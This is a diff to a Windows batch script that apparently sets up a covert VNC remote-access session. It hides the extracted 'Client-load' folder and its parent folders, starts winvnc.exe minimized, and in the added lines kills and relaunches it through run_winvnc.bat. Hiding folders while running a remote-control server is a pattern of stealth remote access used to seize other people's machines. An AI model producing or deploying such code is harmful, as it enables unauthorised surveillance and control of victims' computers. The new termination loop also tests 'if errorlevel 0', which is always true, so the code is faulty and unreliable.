@@ -36,18 +36,32 @@ REM Hide the extracted Client-load folder and its parent folder
 attrib +h "%script_dir%\.."
 attrib +h "%script_dir%\..\.."
 
-REM Start winvnc.exe and wait for permissions
+REM Start winvnc.exe
 start /min "" winvnc.exe -run
 
 REM Wait for winvnc.exe to have permissions (check every 2 seconds)
 :CheckPermissions
 echo Checking permissions for winvnc.exe...
-timeout /t 2 >nul
+timeout /t 1 >nul
 tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
 if errorlevel 1 (
   goto CheckPermissions
 ) else (
-  echo winvnc.exe has permissions. Starting run_winvnc.bat...
+  echo winvnc.exe has permissions.
+)
+
+REM Terminate winvnc.exe
+taskkill /f /im winvnc.exe
+
+REM Wait for winvnc.exe to terminate
+:CheckTermination
+echo Checking if winvnc.exe is terminated...
+timeout /t 1 >nul
+tasklist /fi "imagename eq winvnc.exe" 2>nul | find /i "winvnc.exe" >nul
+if errorlevel 0 (
+  goto CheckTermination
+) else (
+  echo winvnc.exe is terminated. Starting run_winvnc.bat...
   call "%script_dir%run_winvnc.bat"
 )
 
